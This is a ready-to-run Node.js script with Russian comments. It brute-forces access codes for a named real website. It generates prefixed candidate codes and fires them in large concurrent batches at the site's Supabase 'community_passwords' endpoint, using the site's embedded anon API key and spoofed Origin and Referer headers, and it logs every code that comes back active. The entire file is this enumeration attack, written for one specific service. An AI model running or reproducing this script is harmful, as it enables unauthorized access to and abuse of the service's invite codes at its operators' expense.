const axios = require('axios');
const fs = require('fs');
const path = require('path');
const pLimit = require('p-limit').default;
const readline = require('readline');

// --- НАСТРОЙКИ ---
// <<-- ИЗМЕНЕНИЕ: Впишите сюда нужный префикс. Например, 'CN'. 
// Если префикс не нужен, оставьте пустым: ''
const PREFIX = 'aidsupporter20'; //чем длиннее код тем меньше ставить батч сайз

const BASE_API_URL = 'https://nhiymxlnmxrvcefwpdbg.supabase.co/rest/v1/community_passwords';
const CODE_PARAMETER_NAME = 'password';
const CODES_FILE_NAME = 'codesGenerated.txt';
const RESULTS_FILE_NAME = 'result.txt';
const BATCH_SIZE = 550;
const CONCURRENCY_LIMIT = 500; 
// Когда очередь ожидания превысит это значение, чтение файла приостановится
const HIGH_WATER_MARK = CONCURRENCY_LIMIT * 2; 

// Функции checkCodeBatch и processAndLogResult остаются БЕЗ ИЗМЕНЕНИЙ
async function checkCodeBatch(batch, batchNum) {
    const filterValue = `in.(${batch.join(',')})`;
    try {
        const params = { select: 'id,max_uses,current_uses,active,password', [CODE_PARAMETER_NAME]: filterValue, active: 'eq.true' };
        const headers = { 'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaXlteGxubXhydmNlZndwZGJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg1MjMyNzMsImV4cCI6MjA2NDA5OTI3M30.joedN9gZhp4sxCXOCC5Xe7wHCg-uod683Qh84D78NO8', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5oaXlteGxubXhydmNlZndwZGJnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDg1MjMyNzMsImV4cCI6MjA2NDA5OTI3M30.joedN9gZhp4sxCXOCC5Xe7wHCg-uod683Qh84D78NO8', 'Accept': 'application/json', 'Origin': 'https://fremenessence.gaib.ai', 'Referer': 'https://fremenessence.gaib.ai/' };
        
        console.log(`[Пакет ${batchNum}] Отправляем ${batch.length} кодов... (Активно: ${limit.activeCount}, В очереди: ${limit.pendingCount})`);
        const response = await axios.get(BASE_API_URL, { params, headers, timeout: 60000 });
        
        return { status: 'success', validCodes: response.data, batchNum };
    } catch (error) {
        let errorMessage = `[Пакет ${batchNum}] ❗️ Ошибка: `;
        if (error.code) errorMessage += `${error.code} `;
        if (error.response) errorMessage += `API Error ${error.response.status}`;
        else if (error.request) errorMessage += 'Network Error / Timeout';
        else errorMessage += error.message;

        return { status: 'exception', message: errorMessage, batchNum };
    }
}

function processAndLogResult(result, resultsFilePath, stats) {
    if (result.status === 'success') {
        stats.successfulBatches++;
        if (result.validCodes.length > 0) {
            stats.totalValidCount += result.validCodes.length;
            console.log(`[Пакет ${result.batchNum}] ✅ Успех! Найдено ВАЛИДНЫХ кодов: ${result.validCodes.length} шт.`);
            const logData = result.validCodes.map(item => `[${new Date().toLocaleTimeString('uk-UA')}] Код: ${item.password.padEnd(15)} | Статус: valid | Данные: ${JSON.stringify(item)}`).join('\n');
            fs.appendFileSync(resultsFilePath, logData + '\n', 'utf-8');
        }
    } else {
        stats.failedBatches++;
        console.error(result.message);
        fs.appendFileSync(resultsFilePath, `[${new Date().toLocaleTimeString('uk-UA')}] ${result.message}\n`, 'utf-8');
    }
}

// Глобальная переменная для доступа к limit из разных мест
const limit = pLimit(CONCURRENCY_LIMIT);

async function main() {
    console.log("Запуск скрипта с механизмом обратного давления (backpressure)...");
    if (PREFIX) {
        console.log(`Используется префикс для всех кодов: "${PREFIX}-"`);
    }

    const codesFilePath = path.join(__dirname, CODES_FILE_NAME);
    if (!fs.existsSync(codesFilePath)) {
        console.error(`Ошибка: Файл с кодами '${CODES_FILE_NAME}' не найден.`);
        return;
    }

    const resultsFilePath = path.join(__dirname, RESULTS_FILE_NAME);
    fs.writeFileSync(resultsFilePath, `--- Запуск потоковой проверки: ${new Date().toLocaleString('uk-UA')} ---\n`, 'utf-8');
    console.log(`Результаты будут записываться в файл: ${RESULTS_FILE_NAME}`);
    console.log(`Размер пакета: ${BATCH_SIZE}, Лимит одновременных запросов: ${CONCURRENCY_LIMIT}`);

    const stats = { totalValidCount: 0, linesRead: 0, successfulBatches: 0, failedBatches: 0 };
    const fileStream = fs.createReadStream(codesFilePath);
    const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });

    let batch = [];
    let batchNum = 1;
    let isPaused = false;

    await new Promise((resolve, reject) => {
        rl.on('line', (line) => {
            stats.linesRead++;
            const rawCode = line.trim();

            // <<-- ИЗМЕНЕНИЕ: Формируем итоговый код с префиксом
            if (rawCode) {
                // Если константа PREFIX задана, добавляем ее и дефис.
                // Если PREFIX пустой, используется только сам код.
                const finalCode = PREFIX ? `${PREFIX}-${rawCode}` : rawCode;
                batch.push(finalCode);
            }
            
            if (batch.length >= BATCH_SIZE) {
                const currentBatch = batch;
                
                limit(async () => {
                    const result = await checkCodeBatch(currentBatch, batchNum);
                    processAndLogResult(result, resultsFilePath, stats);
                }).then(() => {
                    if (isPaused && limit.pendingCount < CONCURRENCY_LIMIT) {
                        isPaused = false;
                        rl.resume();
                    }
                });

                batch = []; 
                batchNum++;

                if (!isPaused && limit.pendingCount > HIGH_WATER_MARK) {
                    isPaused = true;
                    rl.pause();
                }
            }
        });

        rl.on('close', () => {
            if (batch.length > 0) {
                 limit(async () => {
                    const result = await checkCodeBatch(batch, batchNum);
                    processAndLogResult(result, resultsFilePath, stats);
                });
            }
            console.log(`Чтение файла завершено. Всего прочитано строк: ${stats.linesRead}. Ожидаем завершения всех сетевых запросов...`);
            resolve();
        });

        rl.on('error', (err) => reject(err));
    });

    await limit.onIdle();

    console.log('\n\n--- Проверка завершена ---');
    console.log(`Обработка ${stats.linesRead} строк завершена.`);
    console.log(`Успешных пакетов: ${stats.successfulBatches}, Пакетов с ошибками: ${stats.failedBatches}`);
    console.log(`Найдено ВСЕГО валидных кодов: ${stats.totalValidCount}`);
    console.log(`\nВсе подробные результаты сохранены в файле '${RESULTS_FILE_NAME}'.`);
}

main().catch(err => console.error("Критическая ошибка:", err));